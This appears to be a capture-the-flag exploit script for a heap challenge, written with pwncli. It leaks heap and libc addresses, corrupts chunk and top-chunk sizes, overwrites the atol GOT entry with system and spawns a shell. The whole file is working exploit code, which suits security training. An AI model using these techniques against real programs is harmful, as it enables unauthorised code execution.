#!/usr/bin/python3
from pwncli import *
context.buffer_size = 0x2000
cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def read_name(name):
    p.sendafter("name :", name)

def add(size, data="deadbeef"):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Size of page :", str(size))
    p.sendafter("Content :", data)


def show(idx):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index of page :", str(idx))
    p.recvline_contains("Content :")
    m = p.recvline(0)
    info(f"Get info: {m}")
    return m


def edit(idx, data):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index of page :", str(idx))
    p.sendafter("Content:", data)


def name_info(name="", choose=1):
    p.sendlineafter("Your choice :", "4")
    m = p.recvline_startswith("name : ")
    info(f"Get info: {m}")
    p.sendlineafter("Do you want to change the name? (yes:1 / no:0) ", str(choose))
    if choose:
        read_name(name)
    return m


read_name("a"*0x40)

add(0x1e770)

m = name_info(choose=0)
heap_base = u64_ex(m[0x47:]) - 0x260
log_heap_base_addr(heap_base)

add(0xf8)
edit(1, "a"*0xf8)
edit(1, b"a"*0xf8+p16(0x521))

add(0x600)

edit(1, b"a"*0xf8+p16(0x2001))

add(0x2000-0x10, flat({0x1b28:0x9f1})) # 3 

add(0x1000)

edit(3, flat({0x1b28:[0x9f1, 0, 0x602100-0x10]}))

add(0x9e0)

m = name_info(flat(0, 0x20ff1))
libc_base = u64_ex(m[0x47:]) - 0x3ebca0
log_libc_base_addr(libc_base)
libc.address = libc_base

edit(0, flat([0x6020c0, 0, libc_base + 0x3ebca0, libc_base + 0x3ebca0]))

add(0x60, flat({0x30:[[elf.got.atol]*4]}))

edit(1, p64(libc.sym.system))

p.sendline("/bin/sh")

get_flag_when_get_shell(p)

p.interactive()